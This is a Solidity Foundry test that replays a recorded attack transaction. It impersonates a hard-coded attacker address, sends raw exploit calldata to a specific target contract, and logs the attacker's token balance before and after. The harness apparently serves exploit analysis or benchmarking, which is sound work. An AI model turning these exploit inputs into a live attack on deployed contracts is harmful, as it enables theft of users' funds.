// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./X_PlayerBase.sol";

contract ReplayTest is X_PlayerBase {
    address constant ATTACKER_ADDR = 0x9dF9A1D108EE9c667070514b9A238B724a86094F;
    address constant TARGET_ADDR = 0x80bd723DC38A07952dB40C1C2A45084714399bD9;
    bytes constant INPUT_DATA = hex"be2684d4000000000000000000000000000000000000000000b5facfe5b81c365c000000000000000000000000000000c2c4ccde8948c693d0b04f8bad461e35a12f20b80000000000000000000000009b0ff36de2fc477cda8e4468e0067322ae18ce70000000000000000000000000b413271b84902c95f01015d58326dda59a74785400000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000009323032362d312d32380000000000000000000000000000000000000000000000";

    function testReplay() public {
        beneficiary = ATTACKER_ADDR;
        if (fundingToken == address(0)) vm.deal(address(this), 0);
        _logTokenBalance(fundingToken, beneficiary, "[REPLAY] Before");
        
        uint256 gasBefore = gasleft();
        try this._executeReplay() {
            uint256 gasUsed = gasBefore - gasleft();
            (string memory symbol, uint256 balance, uint8 decimals) = _getTokenData(fundingToken, beneficiary);
            _logTokenBalance(fundingToken, beneficiary, "[REPLAY] After");
            _writeExecutionResult("REPLAY", gasUsed, balance, symbol, decimals);
        } catch Error(string memory reason) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", reason, gasUsed);
            emit log_string(string(abi.encodePacked("[REPLAY] Reverted: ", reason)));
            revert(reason);
        } catch (bytes memory) {
            uint256 gasUsed = gasBefore - gasleft();
            _writePartialResult("REPLAY_FAILED", "Low-level revert", gasUsed);
            emit log_string("[REPLAY] Low-level revert");
            revert("Low-level revert");
        }
    }

    function _executeReplay() external {
        vm.startPrank(ATTACKER_ADDR);
        (bool success, bytes memory returnData) = TARGET_ADDR.call(INPUT_DATA);
        if (!success) {
            if (returnData.length > 0) {
                assembly {
                    revert(add(returnData, 32), mload(returnData))
                }
            }
            revert("Replay failed");
        }
        vm.stopPrank();
    }
}
